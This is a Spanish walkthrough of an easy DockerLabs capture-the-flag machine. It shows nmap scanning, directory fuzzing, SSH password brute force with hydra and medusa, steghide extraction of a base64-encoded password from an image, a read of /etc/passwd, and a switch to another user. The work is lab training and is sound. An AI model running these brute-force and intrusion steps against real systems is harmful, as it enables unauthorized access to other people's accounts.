
> Habilidades: Enumeración, fuerza bruta, escalada de privilegios (linux), esteganografía.


# RECONOCIMIENTO


## Nmap Scan

Realizamos el primer sondeo a la ip de la victimma para averiguar que puertos están abiertos:

~~~ bash
nmap --open -p- -n -sS -Pn $ip -oG FirsScan
~~~

![Primer_Escaneo](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/Nmap1Scan.png)

- `--open`: Nos muestre los puertos abiertos.
- `-p-`: Escanear todo el rango de puertos (65535)
- `-sS`: Escaneo TCP SYN, técnica más sigilosa para determinar el estado del puerto.
- `-n`: No aplicar resolución DNS.
- `-Pn`: Deshabilitar el descubrimiento de host, asumiendo que el objetivo se encuentra activo.
- `-oG`: Exportar el escaneo a un formato `Grepable`, util para extraer información.

_____________________________________________________________________________________________________________________________________________________________________

### Enumerar Servicios

Realizamos enumaeración a los puertos abiertos.
~~~ bash
nmap -sVC -p 22,80 172.17.0.2 -oN ServicesScan
~~~

![Escaneo_Sevicios](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ServicesScan.png)
- `-sC`: Ejecuta scripts NSE (Nmap Scripting Engine) predeterminados.
- `-sV`: Detecta la versión del servicio que se está ejecutando en cada puerto abierto.
_____________________________________________________________________________________________________________________________________________________________________

## Http Service


Vemos el puerto `80` que corresponde a un servicio `http`, veamos que hay en él. Podemos usar la herramienta `whatweb` para listar las tecnologías detectadas en el servidor. (Como alternativa, puedes usar la extension de navegador Wappalyzer)

~~~ bash
whatweb http://172.17.0.2
~~~

![whatweb](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/whatweb.png)

Abrimos en navegador y vamos a dicha web, leemos y podemos ver algo interesante, una nota de `Carlota`.
Yo siempre reviso view-source de la web por si se me escapa algo interesante.
![despido](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/despidoempleado.png)

_____________________________________________________________________________________________________________________________________________________________________

## Fuzzing



El siguiente paso será intentar descubrir posibles directorios, podemos usar cualquier herramienta de fuzzing, yo usaré `wfuzz` y `gobuster`

### Wfuzz
~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://172.17.0.2/FUZZ
~~~

![wfuzz](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/zfuzz.png)

- `-c`: Formato colorizado
- `--hc=404`: Ocultar el código de estado 404 (Not Found)
- `-w`: Especificar un diccionario de palabras
- `-t 200`: Dividir el proceso en 200 hilos, agilizando la tarea


### Gobuster

~~~ bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
~~~

![gobuster](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/burp.png)

- `dir`: Modo de descubrimiento de directorios y archivos
- `-u`: Dirección URL
- `-w`: Diccionario a usar
- `-t 200`: Establecer 200 subprocesos 

Podemos ver que en ambos casos no se ha descubierto ningun directorio. :(
_____________________________________________________________________________________________________________________________________________________________________

## Fuerza Bruta

Como obtuvimos dos nombres anteriormente, vamos a intenta hacer fuerza bruta con uno de ellos. En este caso usaremos dos herramientas diferentes aunque con el mismo resultado.

~~~ bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
~~~

![hydra](https://i.imgur.com/gHUFhTq.png)


- `-l`: Especifica un nombre.
- `-P`: Especifica una lista de palabras.
- `-t4`: Especifica hilos a usar. (más rapido)
- `ssh`: Especifica el protocolo.

~~~ bash
medusa -h 172.17.0.2 -u carlota -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
~~~
![medusa](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/medusa.png)

- `-h`: Especifica la dirección IP del objetivo.
- `-u`: Especifica el nombre de usuario a probar.
- `-P`: Especifica el archivo de lista de contraseñas a utilizar.
- `-M`: Especifica el módulo a utilizar, en este caso SSH.
- `-t 4`: Especifica el número de hilos a utilizar para agilizar el proceso.

__¡¡BINGO!! obtuvimos las credenciales de Carlota.__

_____________________________________________________________________________________________________________________________________________________________________
# Escalada de privilegios

Una vez tenemos acceso, tratamos la TTY para poder usarla comodamente, para ello cambiaremos el valor de la variable `$TERM`. En este caso, nuestra shell (SSH) ya es interactiva, solo necesitaremos export TERM=xterm.

~~~ bash
/bin/bash -i
export TERM=xterm
~~~

## Enumeracion entorno

En primer lugar veremos si tenemos privilegios `sudo` mediante `sudo -l`, pero no hay suerte. Seguimos enumerando y vemos una imagen en una carpeta de Carlota.

![estego](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/estego.png)

Vamos a comprobar si tiene información oculta. En primer lugar nos la descargamos, para ello lo vamos a hacer de dos modos diferentes, es bueno saver varias maneras de hacer las cosas ya que no siempre funcionan los mismos metodos.

~~~ bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /opt/amor
~~~
![scp](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/scp.png)

El segundo sería crear un servidor temporal con python y descargarla desde el lado del atacante.

~~~ bash
Victima
python3 -m http.server 8080
~~~
![httpserver](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/httpserver.png)
~~~
Atacante
wget http://172.17.0.2:8080/imagen.jpg
~~~
![wget](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/wget.png)


## Esteganografía

Para comprobar si tiene informacion oculta o metadatos, usaremos la herramienta steghide.

Con las opciones extract y sf estraemos los metadatos si los hubiera en un archivo.

~~~
steghide extract -sf imagen.jpg
~~~
El contenido del archivo parece estar codificado en base64.

![steg](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/stg.png)

Decodificamos con un simple comando.

~~~
cat secret.txt | base64 -d
~~~
![decode](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/decode.png)

Probamos el resultado para escalar a root pero no hay suerte. Revisamos el archivo /etc/passwd para ver los usuarios.
Obseramos tres usuarios activos, oscar, carlota y root.

~~~
cat /etc/passwd
~~~
![users](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/users.png)

Intentamos usar la contraseña encoontrada en Oscar y parece que funciona.
~~~
su oscar
whoami
~~~
![whoami](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/oscar.png)






